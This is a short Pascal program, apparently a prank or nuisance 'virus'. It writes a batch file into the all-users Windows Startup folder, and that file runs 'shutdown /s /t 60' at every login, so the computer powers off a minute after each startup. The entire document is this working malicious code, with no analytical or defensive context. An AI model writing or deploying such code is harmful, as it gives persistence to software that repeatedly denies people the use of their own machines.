begin
  assign(output,'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\virus_shutdown_2017_10.bat');
  rewrite(output);
  writeln('shutdown /s /t 60');
  close(output);
end.

